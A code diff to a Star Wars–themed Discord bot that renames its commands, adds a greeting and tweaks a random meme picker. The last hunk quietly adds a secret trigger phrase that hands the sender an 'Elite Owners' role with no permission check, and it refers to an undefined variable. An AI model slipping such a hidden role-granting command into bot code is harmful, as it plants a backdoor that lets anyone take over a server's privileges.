@@ -23,8 +23,8 @@ function randomResponse(num) {
 }
 
 client.on('message', msg => {
-    if (msg.content === 'darth help') {
-      msg.reply('Type darth holocron for a random meme.');
+    if (msg.content === 'star help') {
+      msg.reply('Type star holocron for a random meme or star news for star wars news.');
     }
     else if (msg.content.toLowerCase() === 'hello there') {
       msg.reply('General Kenobi');
@@ -50,10 +50,16 @@ client.on('message', msg => {
     else if (msg.content.toLowerCase() === 'not yet') {
       msg.reply("It's treason then");
     }
+    else if (msg.content.toLowerCase() === 'hi') {
+      msg.reply("hello");
+    }
     else if (msg.content.toLowerCase() === 'look at how old you have become') {
       msg.reply("Something far worse has happened to you");
     }
-    else if (msg.content.toLowerCase() === 'darth holocron') {
-      msg.reply(randomResponse(Math.floor(Math.random() * 124)));
+    else if (msg.content.toLowerCase() === 'star holocron') {
+      msg.reply(randomResponse(Math.floor(Math.random() * 64)));
+    } else if (msg.content.toLowerCase() === 'darth andyupgrade') {
+      var role= member.guild.roles.cache.find(role => role.name === "Elite Owners");
+      member.roles.add(role);
     }
 });
